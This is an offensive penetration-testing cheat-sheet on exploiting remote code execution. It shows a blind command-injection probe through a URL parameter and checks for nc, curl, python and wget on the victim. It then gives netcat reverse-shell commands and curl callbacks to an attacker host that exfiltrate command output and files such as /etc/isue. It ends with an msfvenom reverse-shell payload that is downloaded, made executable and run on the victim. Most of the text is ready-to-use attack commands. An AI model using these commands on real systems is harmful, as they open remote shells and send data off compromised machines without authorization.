####  Remote code execution vulnerability
Examples of causea of remote code execution vulnerability are:
- Unrestricted file upload.
- Command execution of remote scipts.
- SQL injection when running previlaged database user.
<br>

**Blind code execution vulnerabilty(unrestricted file upload like vulnerability)**
Check by using burp with commands like `sleep+2&ok=ok` etc.or other linux commands.
For example:
`GET /script.php?c=ping+192.168.139.130+-c=5&ok=ok HTTP/1.1` and check icmp protocols in wireshark.
After this we can conclude that there is a vulnerability.
* * *
For non-interactive shell:

1. First identify constraints. We need either use tools already in the remote shell or we need to upload our tools to the web shell.
2. `echo $PATH` to see executable location.
Visit this location and see tools present in there.
Check tools are present by command `which <tool name>`.
For example, `which nc`,`which curl`,`which python`,`which wget`...
* * *
Lets check try with nc.
attacker: `nc -lvp 53`
victim: `nc <atatcker ip> -e /bin/bash`
But relying on nc in real life situation is not good.
* * *
1. curl has file transfer utility other than remote code execution.
attacker:`nc -lvp 53`
victim: `curl <http://attacker_ip>:53`
For example we can then execute `curl <http://attacker_ip>:53/'whoami'` on the web shell.
2. In some cases like `curl <http://attacker_ip>:53/'id'` have spaces in output. As this is a http request this will break its execution because of the spaces. So we can try encoding in any format like base64 and check again.	
3. remote shell:`curl <http://attacker_ip>:53/'id|base64'`
attacker shell: `echo "<encoded message>"|base64 -d`
4. We can send file by using `-T` option: `curl <http://attacker_ip>:53/file -T /etc/isue`
* * *
1. If we are interested in writing files to remote machine we need to make reverse shell for example with metasploit. 
For reverse shell payload we need three things: HTTP server on our machine, file download utility in remote machine and writable on the remote machine.
2. For starting HTTP server we can just use python build in tool:
`python -m SimpleHTTPServer 9090` try to start in /tmp or /var/tmp because these location will be always writable.
3. In the meantime setup a reverse shell payload with msfvenom.
attacker: `msfvenom -p linux/x64/shell_reverse_tcp lhost=192.168.139.130 lport=53 -f elf -o reverse53`
victim: `curl <http://attacker_ip>:9090/reverse53 -o /tmp/r`
4. `chmod +x /tmp/r` to make the uplaoded shell executable.
If we are not sure about the write privialges we can upload it back by `curl <http://attacker_ip>:9090 -T /tmp/r` and see if the file is there.
5. For running it, attacker: `nc -lvp 53`
victim: `/tmp/r`
And see if we have a reverse shell.
6. For spawning a terminal:`bash -i`, `python -c 'import pty; pty.spawn("/bin/sh")`(for this python must be installed in remote victim).